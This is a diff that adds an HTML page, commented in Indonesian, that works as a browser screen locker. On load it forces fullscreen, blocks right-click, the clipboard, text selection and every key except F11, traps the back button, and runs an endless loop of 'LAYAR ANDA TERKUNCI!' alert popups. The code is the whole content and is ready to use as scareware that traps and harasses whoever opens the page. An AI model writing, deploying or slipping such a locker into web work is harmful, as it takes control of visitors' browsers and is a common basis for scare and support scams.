@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<title>Layar Terkunci Super Ketat</title>
+<style>
+  html, body {
+    margin: 0; padding: 0;
+    width: 100vw; height: 100vh;
+    background: black;
+    user-select: none;
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: Arial, sans-serif;
+    overflow: hidden;
+    cursor: none; /* Sembunyikan kursor mouse */
+  }
+</style>
+</head>
+<body>
+
+<script>
+  let aktif = true;
+  const tombolKeluar = 'F11'; // Tombol keluar
+
+  // Blok klik kanan dan clipboard
+  document.addEventListener('contextmenu', e => e.preventDefault());
+  document.addEventListener('copy', e => e.preventDefault());
+  document.addEventListener('cut', e => e.preventDefault());
+  document.addEventListener('paste', e => e.preventDefault());
+
+  // Blok semua tombol kecuali tombolKeluar (F11)
+  document.addEventListener('keydown', e => {
+    if (!aktif) return;
+
+    if (e.key === tombolKeluar) {
+      aktif = false;
+      alert('Kunci layar dihentikan, kamu bisa keluar sekarang.');
+      if (document.exitFullscreen) document.exitFullscreen();
+      else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+      else if (document.msExitFullscreen) document.msExitFullscreen();
+      document.body.innerHTML = '<h1 style="color:white;">Kunci layar dihentikan</h1>';
+      return;
+    }
+
+    e.preventDefault();
+    e.stopPropagation();
+  }, true);
+
+  // Cegah tombol back browser
+  function cegahKembali() {
+    window.history.pushState(null, '', window.location.href);
+  }
+  cegahKembali();
+  window.addEventListener('popstate', () => {
+    if (aktif) cegahKembali();
+  });
+
+  // Cegah reload dan navigasi keluar dengan konfirmasi
+  window.addEventListener('beforeunload', e => {
+    if (aktif) {
+      e.preventDefault();
+      e.returnValue = 'Halaman ini terkunci, tekan F11 untuk keluar!';
+      return 'Halaman ini terkunci, tekan F11 untuk keluar!';
+    }
+  });
+
+  // Blok seleksi dan drag
+  document.addEventListener('selectstart', e => e.preventDefault());
+  document.addEventListener('dragstart', e => e.preventDefault());
+
+  // Fullscreen otomatis
+  async function layarPenuh() {
+    const el = document.documentElement;
+    try {
+      if (el.requestFullscreen) await el.requestFullscreen();
+      else if (el.webkitRequestFullscreen) await el.webkitRequestFullscreen();
+      else if (el.msRequestFullscreen) await el.msRequestFullscreen();
+      return true;
+    } catch(e) {
+      return false;
+    }
+  }
+
+  // Popup spam terus menerus
+  function popupSpam() {
+    if (!aktif) return;
+    for(let i = 0; i < 10; i++) {
+      setTimeout(() => alert("LAYAR ANDA TERKUNCI!"), i);
+    }
+    setTimeout(popupSpam, 1);
+  }
+
+  window.onload = async () => {
+    await layarPenuh();
+    popupSpam();
+  };
+</script>
+
+</body>
+</html>
